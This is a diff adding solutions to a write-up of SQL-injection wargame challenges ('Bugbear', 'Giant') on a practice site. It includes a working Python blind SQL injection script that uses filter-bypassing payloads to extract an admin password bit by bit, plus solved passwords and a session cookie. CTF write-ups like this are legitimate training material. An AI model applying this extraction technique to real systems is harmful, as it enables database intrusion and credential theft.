@@ -269,3 +269,67 @@ Try the password in the url by setting it to the argument 'pw'
 like:  ?pw=0b70ea1f
 
 
+## Bugbear
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Bugbear.png)
+
+Script:
+
+                import requests
+                url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
+                header={"Cookie":"PHPSESSID=vrtv56j0c39a3evo84vq6p1ded"}
+                sess=requests.session()
+
+                payload="?no=0%09||%09length(pw)%09in%09("
+                for i in range(1,100):
+                    pay=url+payload+str(i)+")%23"
+                    x=sess.get(pay,headers=header)
+                    print("Check:",i,end=" ")
+                    
+                    if "Hello admin" in x.text:
+                        length=i
+                        break
+                    else:
+                        print("Fail")
+                print("Success\nlength:",length)
+
+
+                payload="?no=0%09||%09id%09in%09(\"admin\")%26%26%09"
+                password=''
+                for i in range(1,length+1):
+                    bits=''
+                    print("check:",i,end="")
+                    for j in range(1,length+1):
+                        pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1)%09in%09(1)%23"
+                        x=sess.get(pay,headers=header)
+                        
+                        if "Hello admin" in x.text:
+                            bits+='1'
+                        else:
+                            bits+='0'
+                    password+=''.join(chr(int(bits, 2)))
+                    print("\t",chr(int(bits,2)))
+                print("Password:"+password)
+
+
+
+
+
+
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Bugbearans.png)
+
+Try the password in the url by setting it to the argument 'pw'
+
+like:  ?pw=52dc3991
+
+
+## Giant
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Giant.png)
+
+query : select 1234 fromprob_giant where 1
+
+Link: https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0C
+
+## Assassin
